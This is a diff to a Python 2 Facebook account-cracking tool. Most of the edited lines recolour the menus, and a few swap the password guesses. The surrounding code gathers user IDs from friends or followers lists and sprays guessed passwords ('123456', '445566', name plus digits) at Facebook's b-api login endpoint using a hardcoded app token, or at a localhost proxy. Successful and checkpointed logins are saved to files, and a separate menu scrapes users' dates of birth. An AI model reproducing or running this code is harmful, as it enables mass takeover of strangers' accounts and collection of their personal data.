@@ -56,10 +56,10 @@ def method_menu():
     os.system("clear")
     logo()
     print("")
-    print("\t    \033[1;34mClone Method Menu\033[0;97m")
+    print("\t    \033[1;36mClone Method Menu\033[0;97m")
     print("")
-    print("[1] B-api (Fast)")
-    print("[2] Localhost")
+    print("\x1b[1;93m[1] B-api (Fast)")
+    print("\x1b[1;93m[[2] Localhost")
     print("")
     method_menu_select()
 def method_menu_select():
@@ -89,9 +89,9 @@ def login_select():
         os.system("clear")
         logo()
         print("")
-        print("\t    \033[1;31mFB Token Login\033[0;97m")
+        print("\t    \033[1;32mFB Token Login\033[0;97m")
         print("")
-        token = raw_input(" Past token here : ")
+        token = raw_input("\x1b[1;92m Past token here : ")
         token_s = open(".fb_token.txt","w")
         token_s.write(token)
         token_s.close()
@@ -175,7 +175,7 @@ def b_menu():
     except requests.exceptions.ConnectionError:
         logo()
         print("")
-        print("\t    \033[1;31mTurn on mobile data OR wifi \033[0;97m")
+        print("\t    \033[1;31m❤️Turn on mobile data OR wifi❤️ \033[0;97m")
         print("")
         time.sleep(1)
         raw_input(" Press enter to try again \033[0;97m")
@@ -187,12 +187,12 @@ def b_menu():
     print("")
     os.system('echo -e "-----------------------------------------------"| lolcat')
     print("")
-    print("\x1b[1;92m[1] Crack from public id")
+    print("\x1b[1;91m[1] Crack from public id")
     print("\x1b[1;92m[2] Crack from followers")
-    print("\x1b[1;92m[3] View token")
-    print("\x1b[1;92m[4] Find date of birth")
-    print("\x1b[1;92m[5] Return method menu")
-    print("\x1b[1;92m[6] Logout")
+    print("\x1b[1;93m[3] View token")
+    print("\x1b[1;94m[4] Find date of birth")
+    print("\x1b[1;95m[5] Return method menu")
+    print("\x1b[1;96m[6] Logout")
     print("")
     b_menu_select()
 def b_menu_select():
@@ -220,7 +220,7 @@ def b_menu_select():
 			print("")
 			os.system('echo -e "\t    Public ID Cloning " | lolcat')
 			print("")
-			print(" Target user : "+q["name"])
+			print("\x1b[1;93mTarget user : "+q["name"])
 		except (KeyError , IOError):
 		    print("")
 		    print("\n\t    \033[1;31m Logged in id has checkpoint\033[0;97m")
@@ -240,7 +240,7 @@ def b_menu_select():
 		print("")
 		os.system('echo -e "\t    Followers Cloning " | lolcat')
 		print("")
-		idt = raw_input(" Put Id/user : ")
+		idt = raw_input("\x1b[1;92mPut Id/user : ")
 		os.system("clear")
 		logo()
 		print("")
@@ -283,10 +283,10 @@ def b_menu_select():
 	    b_menu_select()
 	print(" Total IDs : "+str(len(id)))
 	time.sleep(0.5)
-	print(" The process is running in background")
+	print("\x1b[1;94mThe process is running in background")
 	print("")
-	print 47*("-")
-	print('')
+	print 47 *("-")
+	print''
 	
 	
 	def main(arg):
@@ -297,7 +297,7 @@ def b_menu_select():
 		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		    d=json.loads(q)
 		    if 'www.facebook.com' in d['error_msg']:
-		        print("[MARK-CP]] "+uid+" | "+pass1)
+		        print("\x1b[1;92m[MARK-CP] "+uid+" | "+pass1)
 		        cp=open("cp.txt","a")
 		        cp.write(uid+" | "+pass1+"\n")
 		        cp.close()
@@ -314,7 +314,7 @@ def b_menu_select():
 		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		            d=json.loads(q)
 		            if 'www.facebook.com' in d['error_msg']:
-		                print("[MARK-CP] "+uid+" | "+pass2)
+		                print("\x1b[1;93m[MARK-CP] "+uid+" | "+pass2)
 		                cp=open("cp.txt","a")
 		                cp.write(uid+" | "+pass2+"\n")
 		                cp.close()
@@ -331,7 +331,7 @@ def b_menu_select():
 		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                    d=json.loads(q)
 		                    if 'www.facebook.com' in d['error_msg']:
-		                        print("[MARK-CP] "+uid+" | "+pass3)
+		                        print("\x1b[1;93m[MARK-CP] "+uid+" | "+pass3)
 		                        cp=open("cp.txt","a")
 		                        cp.write(uid+" | "+pass3+"\n")
 		                        cp.close()
@@ -344,11 +344,11 @@ def b_menu_select():
 		                            ok.close()
 		                            oks.append(uid)
 		                        else:
-		                            pass4=name+"1122"
+		                            pass4=name+"123456"
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
-		                                print("[MARK-CP] "+uid+" | "+pass4)
+		                                print("\x1b[1;93m[MARK-CP] "+uid+" | "+pass4)
 		                                cp=open("cp.txt","a")
 		                                cp.write(uid+" | "+pass4+"\n")
 		                                cp.close()
@@ -361,11 +361,11 @@ def b_menu_select():
 		                                    ok.close()
 		                                    oks.append(uid)
 		                                else:
-		                                    pass5="445566"
+		                                    pass5="223344"
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'www.facebook.com' in d['error_msg']:
-		                                        print("[MARK-CP] "+uid+" | "+pass5)
+		                                        print("\x1b[1;93m[MARK-CP] "+uid+" | "+pass5)
 		                                        cp=open("cp.txt","a")
 		                                        cp.write(uid+" | "+pass5+"\n")
 		                                        cp.close()
@@ -378,11 +378,11 @@ def b_menu_select():
 		                                            ok.close()
 		                                            oks.append(uid)
 		                                        else:
-		                                            pass6="223344"
+		                                            pass6="334455"
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'www.facebook.com' in d['error_msg']:
-		                                                print("[MARK-CP] "+uid+" | "+pass6)
+		                                                print("\x1b[1;93m[MARK-CP] "+uid+" | "+pass6)
 		                                                cp=open("cp.txt","a")
 		                                                cp.write(uid+" | "+pass6+"\n")
 		                                                cp.close()
@@ -395,11 +395,11 @@ def b_menu_select():
 		                                                    ok.close()
 		                                                    oks.append(uid)
 		                                                else:
-		                                                    pass7="pakistan"
+		                                                    pass7="445566"
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                                    d=json.loads(q)
 		                                                    if 'www.facebook.com' in d['error_msg']:
-		                                                        print("[MARK-CP] "+uid+" | "+pass7)
+		                                                        print("\x1b[1;93m[MARK-CP] "+uid+" | "+pass7)
 		                                                        cp=open("cp.txt","a")
 		                                                        cp.write(uid+" | "+pass7+"\n")
 		                                                        cp.close()
@@ -420,12 +420,12 @@ def b_menu_select():
 	print (" ")
 	print (47*"-")
 	print ("")
-	print (" Process has completed")
-	print (" Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
+	print ("\x1b[1;93mProcess has completed")
+	print ("\x1b[1;93mTotal Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
 	print ("")
 	print (47*"-")
 	print ("")
-	raw_input(" Press enter to back ")
+	raw_input("\x1b[1;93mPress enter to back ")
 	b_menu()
 def view_token():
     os.system("clear")
@@ -444,7 +444,7 @@ def logout():
     print("")
     print("\t    "+c+"Logout Menu"+c2)
     print("")
-    raw_input(" Do you really want to logout ? ")
+    raw_input("\x1b[1;93mDo you really want to logout ? ")
     os.system("rm -rf .fb_token.txt")
     method_menu()
 def extract_dob():
@@ -459,10 +459,10 @@ def extract_dob():
     print("")
     print("\t    "+c+"Extract DOB Of ID"+c2)
     print("")
-    print("[1] Grab from friendlist")
-    print("[2] Grab from followers")
-    print("[3] Grab single id")
-    print("[4] Back")
+    print("\x1b[1;93m[1] Grab from friendlist")
+    print("\x1b[1;93m[2] Grab from followers")
+    print("\x1b[1;93m[3] Grab single id")
+    print("\x1b[1;93m[4] Back")
     print("")
     dob_select()
 def dob_select():
@@ -525,9 +525,9 @@ def dob_select():
 	    print ("\t    \033[1;31mSelect valid option\033[0;97m")
 	    print("")
 	    dob_select()
-	print (" Total IDs : "+str(len(id)))
-	print(" The Process has started")
-	print(" Note : This is for testing only")
+	print ("\x1b[1;93mTotal IDs : "+str(len(id)))
+	print("\x1b[1;93mThe Process has started")
+	print("\x1b[1;93mNote : This is for testing only")
 	print("")
 	print 47*("-")
 	print('')
@@ -553,8 +553,8 @@ def dob_select():
 	print('')
 	print 47*'-'
 	print('')
-	print (' Process has completed')
-	print(' Total DOB :  '+str(len(nms)))
+	print ('\x1b[1;93mProcess has completed')
+	print('\x1b[1;93mTotal DOB :  '+str(len(nms)))
 	print('')
 	print 47*('-')
 	print('')
@@ -588,7 +588,7 @@ def dob():
         print("")
         print("\t    "+c+"Find DOB Of ID"+c2)
         print("")
-        print(" DOB not found")
+        print("\x1b[1;93mDOB not found")
         print("")
         raw_input(" Press enter to try again ")
         extract_dob()
@@ -597,14 +597,14 @@ def dob():
     print("")
     print("\t    "+c+"Find DOB Of ID"+c2)
     print("")
-    print(" Account ID : "+idt)
-    print(" DOB : "+dobs)
+    print("\x1b[1;93mAccount ID : "+idt)
+    print("\x1b[1;93mDOB : "+dobs)
     print("")
     print(47*"-")
     print("")
     conf()
 def conf():
-    ol = raw_input(" Do you want to find again (y/n) ")
+    ol = raw_input("\x1b[1;93mDo you want to find again (y/n) ")
     if ol =="y":
         dob()
     elif ol =="n":
@@ -638,7 +638,7 @@ def l_menu():
         print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
         print("")
         time.sleep(1)
-        raw_input(" Press enter to try again ")
+        raw_input("\x1b[1;93mPress enter to try again ")
         b_menu()
     os.system("clear")
     logo()
@@ -649,10 +649,10 @@ def l_menu():
     print("")
     print(47*"-")
     print("")
-    print("[1] Crack from public id")
-    print("[2] Crack from followers")
-    print("[3] Return method menu")
-    print("[4] Logout")
+    print("\x1b[1;93m[1] Crack from public id")
+    print("\x1b[1;93m[2] Crack from followers")
+    print("\x1b[1;93m[3] Return method menu")
+    print("\x1b[1;93m[4] Logout")
     print("")
     l_menu_select()
 def l_menu_select():
@@ -739,7 +739,7 @@ def l_menu_select():
 	    l_menu_select()
 	print(" Total IDs : "+str(len(id)))
 	time.sleep(0.5)
-	print(" The process is running in background")
+	print("\x1b[1;93mThe process is running in background")
 	print("")
 	print 47*("-")
 	print('')
@@ -758,7 +758,7 @@ def l_menu_select():
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("[Checkpoint] "+uid+" | "+pass1)
+					print("\x1b[1;93m[Checkpoint] "+uid+" | "+pass1)
 					cp = open("cp.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -775,7 +775,7 @@ def l_menu_select():
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("[Checkpoint] "+uid+" | "+pass2)
+							print("\x1b[1;93m[Checkpoint] "+uid+" | "+pass2)
 							cp = open("cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -792,7 +792,7 @@ def l_menu_select():
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("[Checkpoint] "+uid+" | "+pass3)
+									print("\x1b[1;93m[Checkpoint] "+uid+" | "+pass3)
 									cp = open("cp.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -809,13 +809,13 @@ def l_menu_select():
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("[Checkpoint] "+uid+" | "+pass4)
+											print("\x1b[1;93m[Checkpoint] "+uid+" | "+pass4)
 											cp = open("cp.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
 											cps.apppend(uid+pass4)
 										else:
-											pass5 = "112233"
+											pass5 = "334455"
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
@@ -826,7 +826,7 @@ def l_menu_select():
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("[Checkpoint] "+uid+" | "+pass5)
+													print("\x1b[1;93m[Checkpoint] "+uid+" | "+pass5)
 													cp = open("cp.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
@@ -843,13 +843,13 @@ def l_menu_select():
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("[Checkpoint] "+uid+" | "+pass6)
+															print("\x1b[1;93m[Checkpoint] "+uid+" | "+pass6)
 															cp = open("cp.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
 															cps.append(uid+pass6)
 														else:
-															pass7 = "334455"
+															pass7 = "445566"
 															data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7, headers=header).text
 															q = json.loads(data)
 															if "loc" in q:
@@ -860,7 +860,7 @@ def l_menu_select():
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error"]:
-																	print("[Checkpoint] "+uid+" | "+pass7)
+																	print("\x1b[1;93m[Checkpoint] "+uid+" | "+pass7)
 																	cp = open("cp.txt","a")
 																	cp.write(uid+" | "+pass7+"\n")
 																	cp.close()
@@ -874,12 +874,12 @@ def l_menu_select():
 	print("")
 	print(47*"-")
 	print("")
-	print(" The process has completed")
-	print(" Total Ok/Cp :"+str(len(oks)))+"/"+str(len(cps))
+	print("\x1b[1;93mThe process has completed")
+	print("\x1b[1;93mTotal Ok/Cp :"+str(len(oks)))+"/"+str(len(cps))
 	print("")
 	print(47*"-")
 	print("")
-	raw_input(" Press entet to back ")
+	raw_input("\x1b[1;93mPress entet to back ")
 	l_menu()
 if __name__ == '__main__':
     method_menu()
